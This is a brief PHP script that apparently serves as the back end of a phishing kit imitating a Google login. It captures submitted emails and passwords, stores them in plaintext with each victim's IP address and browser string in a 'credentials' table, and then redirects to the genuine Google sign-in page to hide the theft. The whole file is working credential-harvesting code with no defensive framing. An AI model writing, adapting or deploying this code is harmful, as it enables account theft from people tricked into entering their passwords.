<?php
// Database connection settings from environment variables
$db_host = getenv('DB_HOST');
$db_user = getenv('DB_USER');
$db_password = getenv('DB_PASSWORD');
$db_name = getenv('DB_NAME');

// Get the submitted credentials
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$ip_address = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Validate that we have data
if (empty($email) || empty($password)) {
    // Redirect back to the login page if data is missing
    header('Location: index.html');
    exit;
}

// Connect to the database
$conn = new mysqli($db_host, $db_user, $db_password, $db_name);

// Check connection
if ($conn->connect_error) {
    // Log error to a file instead of displaying it
    error_log("Connection failed: " . $conn->connect_error);
    die("A avut loc o eroare. Încercați din nou mai târziu.");
}

// Prepare and execute the SQL statement
$stmt = $conn->prepare("INSERT INTO credentials (email, password, ip_address, user_agent) VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $email, $password, $ip_address, $user_agent);

// Execute the statement
$stmt->execute();

// Close the statement and connection
$stmt->close();
$conn->close();

// Redirect to the real Google login page
header('Location: https://accounts.google.com/');
exit;
?>